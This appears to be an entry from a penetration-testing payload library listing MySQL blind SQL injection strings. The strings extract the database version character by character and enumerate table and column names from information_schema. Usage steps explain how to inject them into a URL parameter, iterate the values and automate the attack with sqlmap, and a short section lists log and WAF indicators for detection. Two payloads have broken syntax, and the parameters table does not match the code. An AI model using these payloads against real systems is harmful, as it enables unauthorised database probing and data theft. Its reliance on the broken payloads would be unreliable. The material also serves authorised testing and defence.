---
id: ee69f169-0491-41d0-a886-86d34ab270c5
name: MySQL-Blind-Substring-Version-Extraction-Payloads
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.556257+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - mysql-injection
  - blind-sqli
  - substring-payloads
platforms:
  - Web
  - MySQL
validated: true
---

# MySQL-Blind-Substring-Version-Extraction-Payloads

## Code

```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

## Description

This SQL code snippet contains example payloads for blind injection to extract MySQL version and schema details using substring equivalents. It demonstrates various functions (SUBSTRING, RIGHT, LEFT, ASCII, MID) to infer characters via boolean conditions, along with schema enumeration from information_schema. These payloads are injected into vulnerable parameters to bypass filters and perform character-by-character data exfiltration without visible output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| position | Starting position in the string to extract (1-based index) | 1 |
| length | Number of characters to extract (often 1 for blind) | 1 |
| comparison_value | Character or ASCII value to test against (iterate 32-126) | '5' or 53 |
| table_offset | LIMIT offset for enumerating multiple tables/columns | 0,1 |

## Usage

Inject these payloads into a vulnerable URL parameter (e.g., ?id=1) during web app testing. For version extraction, replace the example values (e.g., =5, position 1,1) and send requests iteratively, observing response differences for true conditions. For schema, adjust the SELECT to target specific databases/tables. Use in manual testing with Burp Repeater or automate with sqlmap's --technique=B option. This is typically part of reconnaissance in web penetration testing after confirming SQLi.

## Detection

- Web logs showing repeated conditional queries (e.g., AND, SUBSTR, version()) with incremental changes.
- High volume of requests to the same endpoint with varying parameters, indicating boolean probing.
- Anomalous access to information_schema tables in MySQL audit logs.
- WAF alerts for SQLi patterns involving string functions or comparisons.

## Related

- [[procedures/Extract-MySQL-Version-and-Schema-via-Blind-Substring-Injection]]
